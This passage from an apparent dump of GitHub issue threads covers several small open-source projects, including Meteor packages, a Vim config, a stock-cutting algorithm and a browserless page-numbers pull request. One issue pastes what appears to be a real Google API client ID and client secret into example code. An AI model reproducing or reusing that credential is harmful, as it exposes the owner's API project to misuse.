      <Owner>Firfi</Owner>
      <Body>Sure. It doesn't happen with .js and same syntax.
</Body>
    </Comment>
    <Comment>
      <Owner>grigio</Owner>
      <Body>Mhmm it could be an issue similar to #5 
</Body>
    </Comment>
  </Issue_604>
  <Issue_605>
    <Repository>meteor-react-router-ssr-demo</Repository>
    <Title>Fails wen I add react-router-form package</Title>
    <Owner>grigio</Owner>
    <Body>Trying to get it to work with https://github.com/insin/react-router-form but my console starts to send a lot of errors:

&gt;  Errors prevented startup:                  
&gt; 
&gt;    While building the application:
&gt;    node_modules/react/node_modules/fbjs/flow/lib/dev.js:10:9: Unexpected token
&gt;    var
&gt; 
&gt;    node_modules/react-router-form/node_modules/get-form-data/es6/index.js:182:1:
&gt;    Unexpected reserved word
</Body>
    <State>open</State>
    <Comment>
      <Owner>FBosler</Owner>
      <Body>This post comes up when googling for the the error message I just received. Were you able to solve your problem?&#13;
</Body>
    </Comment>
  </Issue_605>
  <Issue_606>
    <Repository>vim-sublime</Repository>
    <Title>Problem with Monokai</Title>
    <Owner>grigio</Owner>
    <Body>Hi,
I've a problem wiith Monokai color schemes
I found it in .vim/bundle/vim-colorschemes/colors/Monokai.vim
But vim can't load it...
</Body>
    <State>open</State>
    <Comment>
      <Owner>dreamfliper</Owner>
      <Body>Try move `Monokai.vim` to `~/.vim/colors/`, and change it to monokai.vim
</Body>
    </Comment>
    <Comment>
      <Owner>aomnes</Owner>
      <Body>on line 27 of `.vimrc`
Plugin 'colors' instead of Plugin 'flazz/vim-colorschemes'

then move the file `.vim/bundle/vim-colorschemes/colors/`
to `.vim/` it's not useful to change `Monokai.vim` to change it to `monokai.vim`

It's work for me

#17 #16 
</Body>
    </Comment>
  </Issue_606>
  <Issue_607>
    <Repository>xmp-manager</Repository>
    <Title>XMP Manager still active?</Title>
    <Owner>grigio</Owner>
    <Body>Hello Luigi,

I came across your project via this page here: http://www.konradvoelkel.com/2010/01/how-to-manage-the-papers-metadata/ as I have exactly the same problems (not being able to find a suitable software for editing metadata to files in different format). I tried unsuccessfully to run digiwf, which is supposed to be a fork of XMP Manager: https://launchpad.net/~svd/+archive/ubuntu/ppa
I noticed that you haven't worked on XMP manager for quite some time, hence my questions: Is XMP manager still supported? What are the requirements? What file types are supported (I'd like to use it with .pdf, .djvu and .ePub files.). Can I use XMP manager to edit batches of files?

cheers,

Benni
</Body>
    <State>open</State>
    <Comment>
      <Owner>grigio</Owner>
      <Body>Hi @Nichtraucher , yes XMP Manager isn't maintained anymore. The options I can suggest are:
- **Shotwell** (images only), it uses the lib **exiv2** http://www.exiv2.org
- The lib used by XMP Manager: **Exiftool** http://www.sno.phy.queensu.ca/~phil/exiftool
</Body>
    </Comment>
  </Issue_607>
  <Issue_608>
    <Repository>google-calendar-v3</Repository>
    <Title>How to get  YOUR_ACCESS_TOKEN , YOUR_REFRESH_TOKEN?</Title>
    <Owner>priyadarshy</Owner>
    <Body>``` python
# Import the GoogleCalendarAPI Class.
from google_calendar_v3 import GoogleCalendarAPI

# Define a token handler for use on token refresh.
def new_token_handler(token):
    # Do something with your token. Like stick it in a db.
    print "A new token arrived: "
    print token

# Enter in your various credentials here.
access_token = "&lt;YOUR_ACCESS_TOKEN&gt;"
refresh_token = "&lt;YOUR_REFRESH_TOKEN&gt;"
client_id = "902453498010-ubvvvk714bada1o9tog10i3n5fq7cqm.apps.googleusercontent.com"
client_secret = "jK_7QqIZlcxzk-WuLo8Kyc9-"

# Create an instance of the Google Calendar API.
gapi = GoogleCalendarAPI(client_id=client_id, client_secret=client_secret,
             acc_token=access_token, ref_token=refresh_token, expires_in=-30,
             token_updater=new_token_handler)

# Do something with it.
r  = gapi.settings_list("dateFieldOrder")
print t.text

```
</Body>
    <State>open</State>
    <Comment>
      <Owner>J-Katzen</Owner>
      <Body>not an issue - register with google api console

https://code.google.com/apis/console/b/0/
</Body>
    </Comment>
    <Comment>
      <Owner>skanel</Owner>
      <Body>thanks
</Body>
    </Comment>
  </Issue_608>
  <Issue_609>
    <Repository>donejs-online-ide</Repository>
    <Title>Needs file path helper</Title>
    <Owner>leoj3n</Owner>
    <Body>A helper for a component that will convert bangs to forward-slants.&#13;
&#13;
Something like that (doesn't currently work with our project/component setup):&#13;
&#13;
https://github.com/leoj3n/donejs-online-ide/blob/master/src/editor/editor.js#L40-L42&#13;
&#13;
Not sure if it is possible to add stash bindings/helpers that will work with the current project setup?</Body>
    <State>open</State>
    <Comment>
      <Owner>leoj3n</Owner>
      <Body>Would probably want to string replace `!home!ec2-user!`.</Body>
    </Comment>
  </Issue_609>
  <Issue_610>
    <Repository>applifry</Repository>
    <Title>Markdown support</Title>
    <Owner>lorddev</Owner>
    <Body>Markdown support for entered text.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>Note that the one the StackOverflow uses has been released to OSS on Google Code http://blog.stackoverflow.com/2009/12/introducing-markdownsharp/

We can put the binaries in a "build support" directory or tell devs to get it from GC.
</Body>
    </Comment>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>- When typing in a "contenteditable" section, typing `*` at the beginning of a line should result in an ordered list and a list item.
- Surrounding words with asterisks should make them bold, etc.

Note that this is different from the PageDown implementation as they won't be typing in a textarea and then having it visualized.

Keep this code in a separate folder and namespace so that others can borrow it if they want.
</Body>
    </Comment>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>Updated link to MarkdownSharp: https://github.com/StackExchange/MarkdownSharp&#13;
Note that the Nuget package is way too old.</Body>
    </Comment>
  </Issue_610>
  <Issue_611>
    <Repository>applifry</Repository>
    <Title>Simple ability to browse and upvote ideas</Title>
    <Owner>lorddev</Owner>
    <Body>This gets the project off the ground, since it's technically usable at this point.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>Note that the term we will use for "ideas" is "proposal."
</Body>
    </Comment>
  </Issue_611>
  <Issue_612>
    <Repository>coding-standards</Repository>
    <Title>Boy Scout!</Title>
    <Owner>lorddev</Owner>
    <Body>Be a boy scout coder. Always check in your code cleaner than it was when you checked it out.

Some companies will frown on this. That's how you know it's not a place where you want to work.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>Example: Perhaps the two most fundamental rules of programming are DRY and Curly's Law. If you are fixing a bug in a block of JavaScript, and you notice that within the same function, you have the same exact 6-line block of code appearing twice within the space of what's visible on your screen, you should make that a separate function and call it twice instead. The fact that it is called twice within the same function means it violates Curly's Law as well, but for the purpose of this illustration, the DRY fix is a quick one and doesn't take any longer to implement than it did to read the code and recognize it was doing the same exact thing twice.

(Curly's Law is off-topic for the Boy Scout example, as we're trying to emphasize the fact that we can improve things quickly.)
</Body>
    </Comment>
  </Issue_612>
  <Issue_613>
    <Repository>coding-standards</Repository>
    <Title>Incorporate recommendations from Jethro</Title>
    <Owner>lorddev</Owner>
    <Body>From [Jethro Larson](https://github.com/jethrolarson):

&gt; Write good commit logs that state what was changed and link to issue trackers. Don't mix spaces and tabs! Don't over plan, don't over document, don't over engineer, yagni, kiss, make it work without js first; write the manual first; Code like you're designing an API; start with the user experience not the db; know the page lifecycle; understand the waterfall; make everything non-blocking; don't forget the robots
</Body>
    <State>open</State>
    <Comment>
      <Owner>lorddev</Owner>
      <Body>From 37signals: "Getting real starts with the interface, the real screens that people are going to use. It begins with what the customer actually experiences and builds backwards from there. This lets you get the interface right before you get the software wrong."
</Body>
    </Comment>
  </Issue_613>
  <Issue_614>
    <Repository>mylar</Repository>
    <Title>Move all related packages into a unified mylar package</Title>
    <Owner>strikeout</Owner>
    <Body>Can we also somehow refrain from directly modifying the core packages accounts, ddp and mongo?
</Body>
    <State>open</State>
    <Comment>
      <Owner>chafey</Owner>
      <Body>Hi - I just found out about mylar and am interested in learning more about its current status and future.  We are very interested in using Meteor for our future platform but we need to encrypt data at rest so we may be able to help move it forward.  Feel free to email me chafey@gmail.com. Thanks
</Body>
    </Comment>
    <Comment>
      <Owner>0x1d</Owner>
      <Body>i would be interested in this topic as well. any news yet?
</Body>
    </Comment>
    <Comment>
      <Owner>strikeout</Owner>
      <Body>The guys from Gliese-Technology did this particularly well: https://github.com/gliese-technology/mylar-meteor-changes - but merging new changes from meteor-core becomes somewhat difficult with their approach 
</Body>
    </Comment>
    <Comment>
      <Owner>Lennie</Owner>
      <Body>Sounds to me like it might be a good idea to talk to upstream how best to go about with integration. With upstream I mean the Meteor developers. Even if it's just to get suggestions on how best to go about it. They might have some really useful ideas about that.
</Body>
    </Comment>
  </Issue_614>
  <Issue_615>
    <Repository>ERP</Repository>
    <Title>Style is not loading</Title>
    <Owner>AleksKu</Owner>
    <Body>When I am trying to run this project on my laptop, its not loading the style. Then I can see the http://localhost/ERP-master/public/css/app.css is missing. &#13;
What I need to do for solving this issue? Both app.css and app.js are missing.&#13;
&#13;
I am totally new to Laravel. Any help is appreciable.</Body>
    <State>open</State>
    <Comment>
      <Owner>kriskornel</Owner>
      <Body>Hi @nishadmangadan, you need to run command in your terminal:&#13;
1. ```npm install```&#13;
2. ```bower install```&#13;
3. ```gulp```&#13;
&#13;
Make sure you have installed **elixir** in your root project folder&#13;
see on [Laravel docs](https://laravel.com/docs/5.2/elixir)</Body>
    </Comment>
  </Issue_615>
  <Issue_616>
    <Repository>reactive-magic</Repository>
    <Title>'this' scope can get lost when chaining value.update</Title>
    <Owner>ccorcos</Owner>
    <Body>I'm trying out reactive-magic with a TodoMVC app locally and trying to stick to FP paradigms when possible.  I ran into a scoping issue related to how I was calling value.update&#13;
&#13;
See this gist for a complete example of how I was trying to write my store, [https://gist.github.com/tonyfsullivan/16e47357f130d05796d215eb33a6c05f](url)&#13;
&#13;
Not sure if there's a clean way to keep Value and DerivedValue as classes and avoid the scoping issues, but I did try implementing them as functions rather than classes and it worked like a charm, [https://gist.github.com/tonyfsullivan/60c9e1de255524e466e12aa9ec7c0dfb](url)&#13;
&#13;
&#13;
Any thoughts on this approach, or a better way to handle it?</Body>
    <State>open</State>
    <Comment>
      <Owner>ccorcos</Owner>
      <Body>Your problem is function binding. You would have to use bind `.then(todos.update.bind(todos))` or just forget trying to write pointfree.&#13;
&#13;
I'd also mention that this library is the antithesis of pure functional code. I would suggest giving it a fresh mind and see where it takes you.</Body>
    </Comment>
    <Comment>
      <Owner>ccorcos</Owner>
      <Body>Also, thanks for checking it out! :)</Body>
    </Comment>
    <Comment>
      <Owner>ccorcos</Owner>
      <Body>To answer your second question, I'm using classes because they're easier to work with in Typescript because you don't need to have a discriminating property value to distinguish the type. You can use classes in a pure functional way btw. Just think of them like a type. &#13;
&#13;
And I could define prototype methods with bound functions as well which would help you there: `update = () =&gt; {}`</Body>
    </Comment>
    <Comment>
      <Owner>tonyfsullivan</Owner>
      <Body>Ah ha, exactly what I was looking for!  I actually prefer the class design as well, forgot about Typescript's arrow function trick to get around binding on a class's public method&#13;
&#13;
Mind if I file a PR with the change?  Seems like a small thing, but its convenient being able to chain update/set in a promise</Body>
    </Comment>
  </Issue_616>
  <Issue_617>
    <Repository>stock-cutting</Repository>
    <Title>Wrong result?</Title>
    <Owner>ccorcos</Owner>
    <Body>**Testsettings:**&#13;
&#13;
```&#13;
const bladeSize = 0.125;&#13;
const stockSizes = [{ size: 100, cost: 1 }, { size: 140, cost: 1.8 }];&#13;
&#13;
    const input1 = [&#13;
      { size: 110, count: 2 },&#13;
      { size: 66, count: 4 },&#13;
      { size: 80, count: 1 }&#13;
    ];&#13;
    const output1 = howToCutBoards1D({&#13;
      stockSizes: stockSizes,&#13;
      bladeSize: bladeSize,&#13;
      requiredCuts: input1&#13;
    });&#13;
```&#13;
&#13;
**Output:**&#13;
&#13;
```&#13;
0:&#13;
count: 2&#13;
cuts: [110]&#13;
decimal: 2&#13;
stock: {size: 140, cost: 1.8}&#13;
1:&#13;
count: 4&#13;
cuts: [66]&#13;
decimal: 4&#13;
stock: {size: 140, cost: 1.8}&#13;
2:&#13;
count: 1&#13;
cuts: [80]&#13;
decimal: 1&#13;
stock: {size: 140, cost: 1.8}&#13;
```&#13;
&#13;
I expected that he breaks up 2 planks of 140 length into 4 pieces of 66 length, but the algorithm calls for 4 times 140 planks. Is this a bug or do I misinterpreting the output?</Body>
    <State>open</State>
    <Comment>
      <Owner>ccorcos</Owner>
      <Body>Hmm. Looks like `(x, y) =&gt; isSubset(x, y) || isSubset(y, x)` comparing `[66]` with `[66, 66]` and taking the first value instead of the second which is the intension. This is just an optimization that I wrote later trying to get the 2D version to work in a reasonable amount of time (it doesn't).&#13;
&#13;
Just fixed it with this commit: https://github.com/ccorcos/stock-cutting/commit/f074dfd67dd3181fd11c3d9e54eef7e557c8cf9e&#13;
&#13;
New results:&#13;
&#13;
```js&#13;
{ stockSizes: [ { size: 100, cost: 1 }, { size: 140, cost: 1.8 } ],&#13;
  input1:&#13;
   [ { size: 110, count: 2 },&#13;
     { size: 66, count: 4 },&#13;
     { size: 80, count: 1 } ],&#13;
  output1:&#13;
   [ { stock: { size: 100, cost: 1 },&#13;
       count: 1,&#13;
       decimal: 1,&#13;
       cuts: [ 80 ] },&#13;
     { stock: { size: 140, cost: 1.8 },&#13;
       count: 2,&#13;
       decimal: 2,&#13;
       cuts: [ 110 ] },&#13;
     { stock: { size: 140, cost: 1.8 },&#13;
       count: 2,&#13;
       decimal: 2,&#13;
       cuts: [ 66, 66 ] } ] }&#13;
```</Body>
    </Comment>
  </Issue_617>
  <Issue_618>
    <Repository>blaze-meta</Repository>
    <Title>'This package will probably be deprecated in near future'</Title>
    <Owner>yasinuslu</Owner>
    <Body>Hello, I was wondering why blaze-meta should be deprecated in near future, could you provide more informations about that ?

Thank you !
</Body>
    <State>open</State>
    <Comment>
      <Owner>yasinuslu</Owner>
      <Body>Hello, 
I just thought soon flow-router 3.0 will be released with SSR support for blaze. After that isomorphic meta handler [dochead](https://github.com/kadirahq/meteor-dochead) will be a better choice. Blaze-meta won't be able to work on server without some work done. I guess it will be better if i change readme to only reference dochead without deprecation notice.
</Body>
    </Comment>
    <Comment>
      <Owner>maxenceC</Owner>
      <Body>Ok, thank you for your answer !
</Body>
    </Comment>
  </Issue_618>
  <Issue_619>
    <Repository>blaze-meta</Repository>
    <Title>fixing all kind of inputs into set function</Title>
    <Owner>yasinuslu</Owner>
    <Body>my apologies for the inconvenience and confusions. it was my fault. now it should be fine.
</Body>
    <State>open</State>
    <Comment>
      <Owner>yasinuslu</Owner>
      <Body>I'm not sure what this PR changes  :)
</Body>
    </Comment>
    <Comment>
      <Owner>lucendio</Owner>
      <Body>nothing in terms of new featues, but I fixed some flaws/bugs on my recently introduced feature I am truly sorry about the inconvenience I brought up. sorry.
</Body>
    </Comment>
  </Issue_619>
  <Issue_620>
    <Repository>blaze-meta</Repository>
    <Title>Multiple attributes on meta tags</Title>
    <Owner>yasinuslu</Owner>
    <Body>I would love to be able to create a single meta tag for my meta description looking something like this:

```
&lt;meta name="description" property="og:description" content="My awesome website will knock your socks off"&gt;
```

Sadly, that doesn't seem to be possible with the current API. May I instead suggest an API where passing an object with options to `Meta.set` would use the key as the property name and the value as the value for that property. For my example meta tag above, this would look something like this:

```
Meta.set({
  name: 'description',
  property: 'og:description',
  content: 'My awesome website will knock your socks off'
});
```

What do you think?
</Body>
    <State>open</State>
    <Comment>
      <Owner>yasinuslu</Owner>
      <Body>It looks like #1 did you check that issue ?
</Body>
    </Comment>
    <Comment>
      <Owner>madsmao</Owner>
      <Body>Yes, I checked that issue, and no, it's not the same.

What I am suggesting is that the object properties of the options object passed to `Meta.set` should be used to generate the attributes of the resulting meta tag. In other words, if I pass an options object with a property named `foo` and give it the value `bar`, then it will generate a meta tag that looks like this:

```
&lt;meta foo="bar"&gt;
```

An API like that would allow me to generate completely crazy and invalid meta tags, but it would also allow me complete freedom in generating whatever meta tag I want. I don't think it's blaze-meta's job to ensure valid markup. That responsibility should rest with the developer.

Just to clarify, here is another example using completely invalid properties, but hopefully it better illustrates my point than my previous post:

```
Meta.set({
  arnold: 'Schwarzenegger',
  sylvester: 'Stallone',
  bruce: 'Willis'
});
```

And that would generate this meta tag:

```
&lt;meta arnold="Schwarzenegger" sylvester="Stallone" bruce="Willis"&gt;
```

I hope it makes more sense now.
</Body>
    </Comment>
    <Comment>
      <Owner>yasinuslu</Owner>
      <Body>It's crystal clear now. I'll have a look at it. Right now we set and unset things, in order to do that we need to have a key. I might update it to work with in-mem collections.
</Body>
    </Comment>
    <Comment>
      <Owner>madsmao</Owner>
      <Body>Cool. I am glad you agree that this is a good API. An in-memory collection does indeed seem like a viable approach.
</Body>
    </Comment>
  </Issue_620>
  <Issue_621>
    <Repository>meteor-quick-highlightjs</Repository>
    <Title>Results showing twice</Title>
    <Owner>yasinuslu</Owner>
    <Body>For some reason when I'm using

```
 &lt;td colspan="2" title="comment"&gt;
{{#highlight}}
&lt;pre&gt;
&lt;code class="bash"&gt;{{comment}}&lt;/code&gt;
&lt;/pre&gt;
{{/highlight}}
&lt;/td&gt;
```

"{{comment}}" is showing twice. One time highlighted, second time not highlighted. It's like the highlighted code doesn't get called on new data changes. The highlighted code is only the first code showing on page load, and not the reactive refreshes. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>wreiske</Owner>
      <Body>Here's my workaround....

MyView.html

```
&lt;td colspan="2" title="comment"&gt;&lt;pre&gt;&lt;code class="bash"&gt;{{{Highlight comment}}}&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
```

helpers.js

```
    Template.registerHelper('Highlight', function(string) {
        return hljs.highlightAuto(string).value;
    });
```
</Body>
    </Comment>
    <Comment>
      <Owner>yasinuslu</Owner>
      <Body>#highlight should rerender in order to be updated. This might work:

```
{{#with comment}}
{{#highlight}}
&lt;pre&gt;
&lt;code class="lang-bash"&gt;{{this}}&lt;/code&gt;
&lt;/pre&gt;
{{/highlight}}
{{/with}}
```

Interesting workaround though, i'll check it out.
</Body>
    </Comment>
  </Issue_621>
  <Issue_622>
    <Repository>browserless</Repository>
    <Title>feat: page numbers</Title>
    <Owner>Kikobeats</Owner>
    <Body># Why&#13;
&#13;
Puppeteer (as every HTML to PDF tool out there) still lacks support for generated content. This usually comes as a surprise for most people that require some "advanced" features like creating table of contents (TOC) or being able to refer content by it's page number.&#13;
&#13;
Alternative to puppeteer is wkhtmltopdf which does support TOC generation. However it fails to supply a HTML template API, so it's non customisable. Also does not support page number references within a pdf document. On top of that, the browser it uses is dated, which makes it difficult to user modern charting libraries and other advanced css and javascript features.&#13;
&#13;
I needed those features for some client work, so ended up implementing it and port to this library. &#13;
&#13;
# How&#13;
&#13;
It's simple to use:&#13;
&#13;
```node&#13;
const browserless = require('browserless')&#13;
&#13;
;(async () =&gt; {&#13;
  const url = 'https://example.com'&#13;
  const buffer = await browserless.pdf(url, { page_numbers: true })&#13;
  console.log(`PDF generated!`)&#13;
})()&#13;
```&#13;
On the HTML part use elements `&lt;span class="pageNumber"&gt;` or `&lt;span class="pageNumber" rel="someElementId"&gt;`. The resulting PDF will have both elements replaced by current page number or page number that corresponds to the referred `someElementId`.&#13;
&#13;
## Full HTML Example&#13;
&#13;
```html&#13;
&lt;!DOCTYPE html&gt;&#13;
&lt;html lang="en"&gt;&#13;
    &lt;head&gt;&#13;
        &lt;meta charset="utf-8"&gt;&#13;
        &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"&gt;&#13;
        &lt;!-- &lt;link rel="shortcut icon" href="" type="image/x-icon"&gt; --&gt;&#13;
        &lt;title&gt;Example&lt;/title&gt;&#13;
&#13;
        &lt;style&gt;&#13;
         section {page-break-after: always;}&#13;
        &lt;/style&gt;        &#13;
    &lt;/head&gt;&#13;
    &lt;body&gt;&#13;
        &lt;section id="toc"&gt;&#13;
            &lt;h1&gt;Table of Contents:&lt;/h1&gt;&#13;
            &lt;ul&gt;&#13;
                &lt;li&gt;Section 1 -- Page &lt;span class="pageNumber" rel="section1"&gt;X&lt;/span&gt;&lt;/li&gt;&#13;
                &lt;li&gt;Section 2 -- Page &lt;a href="#section2" class="pageNumber" rel="section2"&gt;Y&lt;/a&gt; with navigation&lt;/li&gt;&#13;
                &lt;li&gt;Section 3 -- Page &lt;span class="pageNumber" rel="section3"&gt;&lt;/span&gt;&lt;/li&gt;&#13;
                &lt;li&gt;Section 4 -- Page &lt;span class="pageNumber" rel="section4"&gt;Z&lt;/span&gt;&lt;/li&gt;                &#13;
            &lt;/ul&gt;&#13;
        &lt;/section&gt;&#13;
&#13;
        &lt;section id="section1"&gt;&#13;
            &lt;h1&gt;Section 1&lt;/h1&gt;&#13;
            &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;&#13;
            &lt;p&gt;This should be page: &lt;span class="pageNumber"&gt;&lt;/span&gt;&lt;/p&gt;&#13;
        &lt;/section&gt;&#13;
&#13;
        &lt;section id="section2"&gt;&#13;
            &lt;h1&gt;Section 2&lt;/h1&gt;&#13;
            &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;&#13;
            &lt;p&gt;This should be page: &lt;span class="pageNumber"&gt;&lt;/span&gt;&lt;/p&gt;&#13;
        &lt;/section&gt;&#13;
&#13;
        &lt;section id="section3"&gt;&#13;
            &lt;h1&gt;Section 3&lt;/h1&gt;&#13;
            &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;&#13;
            &lt;p&gt;This should be page: &lt;span class="pageNumber"&gt;&lt;/span&gt;&lt;/p&gt;&#13;
            &lt;p&gt;And &lt;b&gt;Section 4&lt;/b&gt; should be on page: &lt;span class="pageNumber" rel="section4"&gt;PLACEHOLDER&lt;/span&gt;&lt;/p&gt;&#13;
        &lt;/section&gt;        &#13;
&#13;
        &lt;section id="section4"&gt;&#13;
            &lt;h1&gt;Section 4&lt;/h1&gt;&#13;
            &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;&#13;
            &lt;p&gt;This should be page: &lt;span class="pageNumber"&gt;&lt;/span&gt;&lt;/p&gt;&#13;
            &lt;p&gt;And &lt;b&gt;Section 2&lt;/b&gt; should be on page: &lt;span class="pageNumber" rel="section2"&gt;&lt;/span&gt;&lt;/p&gt;            &#13;
        &lt;/section&gt;&#13;
        &#13;
    &lt;/body&gt;&#13;
&lt;/html&gt;&#13;
```&#13;
&#13;
# Implementation Details&#13;
&#13;
I added some code to `browserless` in order to make extension features easier to implement. It could be more polished or allow some kind of dependency injection, making features pluggable.&#13;
&#13;
Page numbers implementation uses [pdf-extract](https://github.com/nisaacson/pdf-extract), which have some dependencies that must be previously installed in the OS. OCR support is not required.&#13;
&#13;
This implementation requires an extra PDF to be generated, so it will make the whole PDF processing and generation slower when using `page_numbers` option. This might have an impact for more processing intense production environments.&#13;
&#13;
Thanks!</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>First of all, this PR is GOLD. Thanks for that!&#13;
&#13;
Until now, I tried to implement features in a pluggable way. &#13;
&#13;
For example, even you are not using `browserless`, you can connect your puppeteer code with `@browserless/goto` to have this kind of advantages.&#13;
&#13;
Probably make sense create a new namespace called `@browserless/pdf` and put the current pdf implementation + this code there.&#13;
&#13;
Then, you can delegate getting a pdf using `@browserless/pdf` and then, if you want to use page numbers, just pass the specific API parameter `pageNumbers` boolean to the module.&#13;
&#13;
I think it fits better with the project structure, also causing less user friction (just install `@browserless/pdf` that contains all the pdf things necessary vs need to install to pdf + pdf dependiente module).&#13;
&#13;
I can do it over your branch and then we can integrate it into the codebase. What do you think? &#128578;</Body>
    </Comment>
    <Comment>
      <Owner>josemf</Owner>
      <Body>Hi Kiko &#128075; &#13;
&#13;
Thanks for following up. What you need from me in order to make the changes you suggest? Access to my repo only?&#13;
&#13;
I like the way you architecture this library--it was one of the reason I picked this project. Also the project statement made sense.&#13;
&#13;
If I may I would suggest other way to make the architecture pluggable. I guess the place we want to hook when developing an extension is around puppeteer `page.pdf(options)` or `page.screenshot(options)` code in the `browserless` module. The extension code might have some specific configuration, it will most likely evaluate some code on the browser and/or run some tool for before generating the actual output content. I would say a middleware pattern might be suited for this. Something that would be used like:&#13;
&#13;
```node&#13;
const browserless = require('browserless')();&#13;
const adBlocker = require('@browserless/adblocker');&#13;
const pageNumbers = require('browserless-pagenumbers');&#13;
const extractHeaderAndFooter = require('browserless-extract-header-footer');&#13;
&#13;
//...&#13;
&#13;
browserless&#13;
  .pdf(url, &#13;
          // Extensions are run in order they are declared here&#13;
          adBlocker({ additionalRules }), &#13;
          pageNumbers(), &#13;
          extractHeaderAndFooter({ onlyFooter: true }))&#13;
  .then(buffer =&gt; {&#13;
      // Do something&#13;
  });&#13;
```&#13;
&#13;
Browserless middlewares could be implemented like this:&#13;
&#13;
```node&#13;
&#13;
module.exports = (config) =&gt; {&#13;
   // Might just check some dependencies, validates the config, etc&#13;
   // ...&#13;
&#13;
  /**&#13;
    * @param options - Actual puppeteer options&#13;
    */&#13;
   return (page, options = {}) =&gt; {&#13;
     // page.evaluate(something)&#13;
     // etc&#13;
     // return Promise, or just return   &#13;
   }&#13;
}&#13;
```&#13;
&#13;
This way extensions would manage their dependencies, documentation and testing. Also people would be able to collaborate/add extensions without having to fork and change browserless code.&#13;
&#13;
Either way you're doing a good job maintaining the project,&#13;
Just let me know what you need from me in order to integrate this changes in the project.&#13;
&#13;
&#128077; &#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Hey @josemf,&#13;
&#13;
I think you're right, but maybe is too soon; feeling the library needs to get more traction in order to have a bigger plugin infrastructure.&#13;
&#13;
In the middle time, I moved the original browserless PDF logic into a specific package ([@browserless/pdf](https://github.com/Kikobeats/browserless/tree/master/packages/pdf)), so we can use simple object flags to enable/disable specific things. Then, in the future, we can move there into specific packages.&#13;
&#13;
One more thing. I noted your code added a temporal file logic because [pdf-extract](https://github.com/nisaacson/pdf-extract) needs it as input. Also, the lib need some specific globals.&#13;
&#13;
Any reason why these things can't be done on memory?&#13;
&#13;
Note that, although is not mandatory, browserless is oriented for serverless scenario, where you don't have guarantees for using temporal files or global programs.</Body>
    </Comment>
    <Comment>
      <Owner>josemf</Owner>
      <Body>Hi @Kikobeats &#13;
&#13;
That's fine &#128077; &#13;
&#13;
I'm curious to know how you plan to evolve this framework. I think there's a lot of convenience this framework could provide, like an option to extract &lt;header&gt; and &lt;footer&gt; tags and set header and footer templates in puppeteer.&#13;
&#13;
Also it would be interesting to see what is possible to implement in terms of PDF metadata. PDF readers usually use those for author, keywords and table of contents.&#13;
&#13;
---&#13;
&#13;
I needed pdf-extract to achieve the simple task of matching text tokens to page numbers. I didn't spent a lot of time exploring pdf-extract API but it looks like it'll only work with a path to a PDF. I guess the main reason is that it depends on pdftk and pdftotext command line utilities, and those will work only with files.&#13;
&#13;
Maybe [pdf2json](https://github.com/modesty/pdf2json/) would also do the trick.&#13;
</Body>
    </Comment>
  </Issue_622>
  <Issue_623>
    <Repository>finepack</Repository>
    <Title>Verify file exists before trying to lint it</Title>
    <Owner>Kikobeats</Owner>
    <Body>In typing up the previous bug report (#11), I mistyped the command as `$ finepack package` (without the ".json" extension because I had multiple package\* files in my directory and I was lazily using CLI auto-complete). I got the following error:

```
$ finepack package # instead of the correct "package.json"

fs.js:439
  return binding.open(pathModule._makeLong(path), stringToFlags(flags), mode);
                 ^
Error: ENOENT, no such file or directory '/Users/pdehaan/dev/tmp/finepack-test2/package'
  at Object.fs.openSync (fs.js:439:18)
  at Object.fs.readFileSync (fs.js:290:15)
  at Object.&lt;anonymous&gt; (/Users/pdehaan/.npm-packages/lib/node_modules/finepack/bin/index.js:31:19)
  at Module._compile (module.js:456:26)
  at Object.Module._extensions..js (module.js:474:10)
  at Module.load (module.js:356:32)
  at Function.Module._load (module.js:312:12)
  at Function.Module.runMain (module.js:497:10)
  at startup (node.js:119:16)
  at node.js:929:3

$ echo $?
8
```

If I'm reading it correctly, it's coming from [here](https://github.com/Kikobeats/finepack/blob/33056e5448ab2955278b235dd5b484f30a71a19b/bin/index.js#L31):

``` js
/* 29: */ var filepath = path.resolve(cli.input[0]);
/* 30: */ var filename = path.basename(filepath);
/* 31: */ var filedata = fs.readFileSync(filepath, {encoding: 'utf8'});
```

We may want to verify that the file exists before attempting to open it barfing all over the Terminal.
